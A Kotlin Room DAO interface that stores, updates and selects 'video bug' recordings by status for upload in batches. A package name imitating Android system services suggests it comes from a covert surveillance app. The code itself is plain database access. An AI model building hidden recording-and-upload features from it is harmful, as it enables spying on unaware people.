package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.VideoBug
import com.android.services.util.AppConstants

@Dao
interface VideoBugDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(videoBug: VideoBug)

    @Query("Update video_bug set status = :status where file_path = :file")
    fun update(file: String, status: Int): Int

    @Query("Select * from video_bug where status = :status order by start_datetime DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllVideoBugs(status: Int): List<VideoBug>
}